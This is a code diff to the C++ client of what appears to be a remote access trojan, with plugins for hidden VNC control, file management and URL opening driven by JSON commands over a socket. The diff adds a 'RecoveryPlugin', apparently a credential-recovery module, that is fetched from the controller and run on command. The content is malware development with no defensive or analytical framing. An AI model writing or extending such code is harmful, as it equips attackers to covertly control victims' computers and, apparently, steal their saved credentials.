@@ -103,6 +103,7 @@ private:
     const string OPEN_URL_PLUGIN_ID = "OpenURLPlugin";
     const string FILE_MANAGER_PLUGIN_ID = "FileManagerPlugin";
     const string HIDDEN_VNC_PLUGIN_ID = "HiddenVNCPlugin";
+    const string RECOVERY_PLUGIN_ID = "RecoveryPlugin";
 
     // Registry helper for initial info
     string getRegValue(HKEY hKeyRoot, const char* subKey, const char* valueName) {
@@ -184,6 +185,14 @@ private:
         }
     }
 
+    void execute_recovery_command(const json& data) {
+        if (pluginMgr.isPluginLoaded(RECOVERY_PLUGIN_ID)) {
+            pluginMgr.executePluginCommand(RECOVERY_PLUGIN_ID, "HandleCommand", sock, data.dump());
+        } else {
+            request_plugin(RECOVERY_PLUGIN_ID, data);
+        }
+    }
+
     void process_json_command(const string& json_str) {
         try {
             auto data = json::parse(json_str);
@@ -224,6 +233,13 @@ private:
 					action == "hvnc_char" || action == "hvnc_doubleclick") {   // ← bu iki eylem eklendi
 				execute_hvnc_command(data);
 			}
+            else if (action == "recovery") {
+                if (pluginMgr.isPluginLoaded(RECOVERY_PLUGIN_ID)) {
+                    pluginMgr.executePlugin(RECOVERY_PLUGIN_ID, "RunPlugin", sock);
+                } else {
+                    request_plugin(RECOVERY_PLUGIN_ID);
+                }
+            }
             else if (action == "message" || action == "messagebox") {
 				string title = data.value("title", "System Message");
 				string text  = data.value("text", "");
@@ -328,6 +344,12 @@ private:
                                         pluginMgr.executePluginCommand(HIDDEN_VNC_PLUGIN_ID, "HandleCommand", sock, pendingPluginCommand);
                                     } else {
                                         pluginMgr.executePlugin(HIDDEN_VNC_PLUGIN_ID, "RunPlugin", sock);
+                                    }
+                                } else if (pluginId == RECOVERY_PLUGIN_ID) {
+                                    if (hasPendingPluginCommand) {
+                                        pluginMgr.executePluginCommand(RECOVERY_PLUGIN_ID, "HandleCommand", sock, pendingPluginCommand);
+                                    } else {
+                                        pluginMgr.executePlugin(RECOVERY_PLUGIN_ID, "RunPlugin", sock);
                                     }
                                 }
                             }
